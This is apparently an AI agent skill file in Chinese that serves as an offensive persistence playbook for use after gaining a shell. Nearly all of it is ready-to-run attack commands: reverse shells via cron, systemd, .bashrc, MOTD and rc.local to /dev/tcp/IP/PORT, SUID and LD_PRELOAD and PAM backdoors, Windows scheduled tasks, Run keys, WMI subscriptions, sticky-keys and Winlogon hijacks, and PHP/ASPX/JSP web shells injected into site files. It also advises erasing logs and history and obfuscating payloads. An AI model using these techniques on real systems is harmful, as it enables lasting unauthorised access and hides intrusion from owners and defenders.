---
name: 'persistence'
description: '持久化全集：Linux(SSH/cron/systemd/SUID/PAM)→Windows(计划任务/注册表/服务/WMI/域)→Web Shell'
whenToUse: '拿到 shell 后需要持久化时：Linux SSH/cron/systemd/SUID/PAM + Windows 计划任务/注册表/服务/WMI。'
metadata: { domain: linux, tier: T1 }
---

# 持久化技术全集

> 🔴 **拿到 shell 后第一件事：建至少 2 条持久化路径，避免 shell 丢了回不去。**

## 0. 持久化原则

```
[ ] 最少 2 条独立路径（一条挂了另一条救）
[ ] 不同类型（避免同一检测规则覆盖全部）
[ ] 不破坏系统（别改关键文件导致系统不稳定）
[ ] 清理痕迹（删除命令历史/日志）
[ ] 定时回连 (cron/schtasks) > 被动等待
```

---

## 1. Linux 持久化

### 1.1 SSH Key 🔴 最简洁

```
# 生成 key
ssh-keygen -t rsa -b 4096 -f ./id_rsa -N ""

# 写入 authorized_keys
echo "ssh-rsa AAAA..." >> /home/user/.ssh/authorized_keys
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
chmod 600 /home/user/.ssh/authorized_keys

# 验证
ssh -i id_rsa user@target
```

### 1.2 Cron Job

```
# 用户 cron (🔴 用 /bin/bash 非 /bin/sh — /dev/tcp 需 bash)
# 🔴 追加而非覆盖: (crontab -l 2>/dev/null; echo "...") | crontab -
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'") | crontab -

# 系统 cron
echo "*/5 * * * * root /tmp/.persist.sh" >> /etc/crontab

# cron.d
echo "*/5 * * * * root /tmp/.persist.sh" > /etc/cron.d/system-update

# @reboot
echo "@reboot root /tmp/.persist.sh" >> /etc/crontab
```

### 1.3 Systemd Service

```ini
# /etc/systemd/system/systemd-update.service
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
```

```
systemctl enable systemd-update.service
systemctl start systemd-update.service
```

### 1.4 .bashrc / .profile

```
# 用户登录时触发
echo 'nohup bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1" &' >> ~/.bashrc
echo 'alias sudo="/var/tmp/.hidden"' >> ~/.bashrc   # 🔴 不用 /tmp
echo "PAYLOAD" >> ~/.profile
echo "PAYLOAD" >> /etc/profile
```

### 1.5 SUID/SGID 后门

```
# 给 shell 设 SUID
cp /bin/bash /var/tmp/.bash      # 🔴 不用 /tmp (重启/定时清理可能丢失)
chmod 4755 /var/tmp/.bash
# 普通用户执行: /var/tmp/.bash -p  # -p 保留 SUID

# 给 Python 设 SUID (如果有)
cp /usr/bin/python3 /var/tmp/.py     # 🔴 不用 /tmp
chmod 4755 /var/tmp/.py
```

### 1.6 LD_PRELOAD 后门

```
# ① 先编译恶意 .so
echo '#include <stdlib.h>
void __attribute__((constructor)) init() {
  setuid(0); setgid(0);
  system("/bin/bash -c \"bash -i >& /dev/tcp/IP/PORT 0>&1\"");
}' > /tmp/evil.c
gcc -shared -fPIC /tmp/evil.c -o /var/tmp/evil.so

# ② 写入 ld.so.preload → 所有新进程加载此 .so → root shell
echo "/var/tmp/evil.so" > /etc/ld.so.preload
# 🔴 重启或新 SSH 连接即触发 — 每次进程启动都执行
```

### 1.7 PAM 后门

```
# 方法: pam_exec.so — 认证时执行任意命令
# 在 /etc/pam.d/common-auth (Debian) 或 /etc/pam.d/sshd 末尾加:
auth    optional    pam_exec.so    /var/tmp/pam_trigger.sh

# pam_trigger.sh 会以 root 执行 — 写反弹 shell 或添加 SUID bash
# 🔴 每次 SSH 密码认证成功触发，不登录也触发

# 更隐蔽: 备份原 pam_unix.so → 编译修改版 → 返回成功 + 记录密码
```

### 1.8 MOTD 后门 (SSH 登录触发)
```
# Debian/Ubuntu: /etc/update-motd.d/ 脚本在每次 SSH 登录时以 root 执行
# 所有脚本按数字顺序执行 → 选一个不显眼的数字
echo '#!/bin/bash' > /etc/update-motd.d/99-sys-check
echo 'nohup bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1" &' >> /etc/update-motd.d/99-sys-check
chmod +x /etc/update-motd.d/99-sys-check
# 🔴 关键: nohup + & 确保不阻塞 SSH 登录 → 不引起怀疑
```

### 1.9 rc.local 后门 (开机启动)
```
# /etc/rc.local 在启动最后阶段以 root 执行
echo '/bin/bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1" &' >> /etc/rc.local
# 🔴 systemd 系统中 rc.local 可能被禁用 → 先启用: systemctl enable rc-local
```

---

## 2. Windows 持久化

### 2.1 计划任务

```
# 创建隐藏计划任务
schtasks /create /tn "SystemUpdate" /tr "powershell -enc <B64>" /sc hourly /mo 1 /ru SYSTEM /f

# XML 导入（更隐蔽）
# 导出任务 → 修改 XML → schtasks /create /tn "Task" /xml task.xml /f
```

### 2.2 注册表 Run Keys

```
# HKCU (当前用户)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

# HKLM (所有用户 → 需管理员)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

# 其他 Run 位置:
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
```

### 2.3 服务

```
# 创建新服务
sc create "SystemUpdate" binPath= "C:\Windows\Temp\payload.exe" start= auto
sc start "SystemUpdate"

# 劫持已有服务
sc config <ServiceName> binPath= "C:\Windows\Temp\payload.exe"
sc start <ServiceName>
```

### 2.4 WMI Event Subscription 🔴 最隐蔽
```
# 原生 PowerShell (无需 PowerSploit) — SYSTEM 权限 + 文件落地零
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{
  Name='SysCheck'; EventNamespace='root/cimv2'; QueryLanguage='WQL'
  Query='SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA Win32_PerfFormattedData_PerfOS_System AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320'
}
$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{
  Name='SysCheckConsumer'; CommandLineTemplate='powershell -enc <B64>'
}
Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{
  Filter=$filter; Consumer=$consumer
}
# 🔴 触发时机: 系统启动后 200-320 秒 (SystemUpTime)
# 🔴 清理痕迹: Get-WmiObject -Namespace root/subscription -Class __EventFilter | Remove-WmiObject
```

### 2.5 启动文件夹

```
# 当前用户
copy payload.exe "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"

# 所有用户
copy payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

### 2.6 DLL 劫持持久化

```
# 找缺失 DLL 路径 → 放置恶意 DLL → 每次启动触发
# 常见目标: OneDrive / Teams / Cortana 等自启动应用的缺失 DLL
```

### 2.7 COM Hijacking

```
# 劫持 COM 对象注册 → 合法程序加载时触发
# 修改 HKCR\CLSID\{...}\InprocServer32 指向恶意 DLL
```

### 2.8 Accessibility 后门 (Sticky Keys)
```
# 替换 sethc.exe (粘滞键) 或 utilman.exe (轻松访问) 为 cmd.exe
# 在登录界面按 5 次 Shift → SYSTEM 权限的 cmd
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant Everyone:F
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

# utilman.exe — 点登录界面右下角轻松访问图标
takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant Everyone:F
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
# 🔴 RDP 登录界面也有效 — 远程触发
```

### 2.9 Winlogon 劫持
```
# Userinit — 用户登录时以 SYSTEM 执行 (在 explorer 之前)
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\Temp\p.exe" /f

# Shell — 替换默认 shell (explorer.exe)
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,C:\Windows\Temp\p.exe" /f
# 🔴 高风险: Userinit 出错 → 用户无法登录！备份原值再改
```

### 2.8 域持久化

```
# Golden Ticket → krbtgt hash → 无限期 TGT
# Silver Ticket → 服务账户 hash → 特定服务 TGS
# Skeleton Key → LSASS 注入 → 任何密码都通过
- 🆕 AdminSDHolder → adminsdholder-abuse — 添加 ACE → SDProp 自动传播到所有受保护组
# DCShadow → 临时 DC → 推恶意属性
# DSRM 密码 → 恢复模式 DA
```

---

## 3. Web Shell 持久化

```
# PHP
<?php system($_GET['c']);?>

# 隐蔽 PHP (伪装 GIF)
GIF89a;<?php system($_GET['c']);?>

# ASPX
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]); %>

# JSP
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# 嵌入已有文件
echo '<?php system($_GET["c"]);?>' >> wp-includes/functions.php
```

---

## 快速决策树

```
Linux:
  有 SSH?     → SSH Key (最简洁)
  有 cron?    → Crontab 反弹 shell (追加之!)
  root?       → Systemd / SUID / PAM / LD_PRELOAD / MOTD / rc.local
  不是 root?  → .bashrc / user cron

Windows:
  是 SYSTEM?  → 服务 / 计划任务 / Accessibility (sethc/utilman)
  是 Admin?   → 注册表 Run / WMI / Winlogon / Accessibility
  普通用户?   → HKCU Run / 启动文件夹
  域环境?     → Golden Ticket / AdminSDHolder / DSRM
```

## 反模式

| ❌ 禁止 | ✅ 正确 |
|--------|--------|
| ❌ 只建 1 条持久化 | ✅ 至少 2 条独立路径 |
| ❌ 在 /tmp 放持久化 (重启丢失) | ✅ /var /etc /opt /home |
| ❌ 反弹 shell 一直连着 | ✅ 定时回连/监听端口 |
| ❌ 留明文 payload | ✅ 混淆/编码/加密 |
